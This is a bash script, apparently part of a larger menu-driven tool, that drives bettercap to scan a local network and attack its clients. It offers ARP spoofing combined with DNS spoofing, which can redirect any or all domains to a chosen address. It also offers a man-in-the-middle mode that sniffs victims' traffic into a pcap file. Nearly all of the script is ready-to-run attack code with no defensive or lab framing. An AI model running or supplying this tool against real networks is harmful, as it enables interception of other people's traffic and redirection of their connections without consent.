#!/bin/bash



scan () {
	read -rp "$(printf "${GREEN} Scan time(sec)....")" sec
	sudo bettercap -iface "$INTER" -eval "net.recon on; net.probe on; wifi.recon on; sleep $sec; net.show; wifi.show; exit" 2>/dev/null
}

better_menu () {
    local gw
    gw=$(ip route | awk '/^default/ {print $3; exit}')
    [[ -z $gw ]] && gw="unavailable"
    read -rp "$(info "Enter Network IP or press [ENTER] for gateway ($gw): ")" input
    if [[ -z $input ]]; then
        SNET="$gw"
    else
        SNET="$input"
    fi
    info "Target set to: $SNET"
    read -rp "$(printf "${MAGENTA}Press Enter to continue...${NC}")"
}
#ip route | awk '/^default/ {print $3; exit}' pulls the gateway IP from the default route line (3rd field is the via address). exit after first match avoids issues if there are multiple default routes (e.g. wlan0 + eth0).

spoof () {
	
	read -rp "$(info "Domain to spoof or ${RED}[All]: ")" DOMA
    if [[ -n $DOMA ]]; then
        DOMAIN="$DOMA"
    else
        DOMAIN="*"
    fi
    info "Domain set to: $DOMAIN"
    
    read -rp "$(info "Location where to spoof or ${RED}Default[Google]: ")" FAKE_IP
    if [[ -n $FAKE_IP ]]; then
        FAKE="$FAKE_IP"
    else
        FAKE="8.8.8.8"
    fi
    info "Spoofing set to: $FAKE"
    
    read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
		TARGET="$TARGET_IP"
	else
		TARGET="$SUNET"
    fi
    
    read -rp "$(printf "${GREEN} Spoofing time(sec)....")" sec
    
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set dns.spoof.domains $DOMAIN;
        set dns.spoof.address $FAKE;
        dns.spoof on;
        sleep $sec;
        exit; "
}

mitm () {
     read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
		TARGET="$TARGET_IP"
	else
		TARGET="$SUNET"
    fi
    
    read -rp "$(printf "${GREEN} Sniff time(sec)....")" sec
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set net.sniff.verbose true;
        set net.sniff.output /tmp/sniff_$(date +%F_%T).pcap;
        net.sniff on;
        sleep $sec;
        exit
    "
}



# ══════════════════════════════════════════════════════════════════════════════
# 		BETTERCAP MENU LOGIC
# ══════════════════════════════════════════════════════════════════════════════

bettercap_menu () {
	
		clear
		while true; do 
		
		bettercap_banner 
		sunet
		
		info "-----Choose Menu-----"
			into "1) Scan Network"
			into "2) Select Network (Wait 5sec After Scan)"
			into "3) DNS+ARP Spoof"
			into "4) MITM"
			out "0) Main Menu"
			
		read -p ">>" choice
		
			case $choice in 
				
				1)scan;;
				
				2)better_menu;;
				
				3)spoof;;
				
				4)mitm;;
				
				0) break;;
				
				*) err "Wrong Choice [ENTER]"
					read -p ">>"
					continue ;;			
			esac
		done
}

